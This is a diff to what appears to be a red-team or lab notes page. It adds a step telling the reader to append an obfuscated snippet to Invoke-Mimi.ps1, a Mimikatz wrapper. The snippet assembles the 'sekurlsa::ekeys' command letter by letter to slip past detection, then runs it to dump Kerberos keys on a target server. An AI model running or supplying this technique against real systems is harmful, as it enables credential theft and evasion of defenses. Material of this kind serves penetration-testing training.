@@ -52,6 +52,26 @@ These two commands together answer:
 in the Constrained Language Mode, we cannot run scripts using dot sourcing (. .\Invoke-Mimi.ps1). So, we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimiEx.ps1) to the target server.
 {% endhint %}
 
+ we need to modify Invoke-Mimi.ps1 script. Add the below encoded value for "sekurlsa::ekeys" to the end of the file and save it.
+```batch
+$8 = "s";
+$c = "e";
+$g = "k";
+$t = "u";
+$p = "r";
+$n = "l";
+$7 = "s";
+$6 = "a";
+$l = ":";
+$2 = ":";
+$z = "e";
+$e = "k";
+$0 = "e";
+$s = "y";
+$1 = "s";
+$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 ;
+Invoke-Mimi -Command $Pwn
+```
 
 ### Execution Policy
 
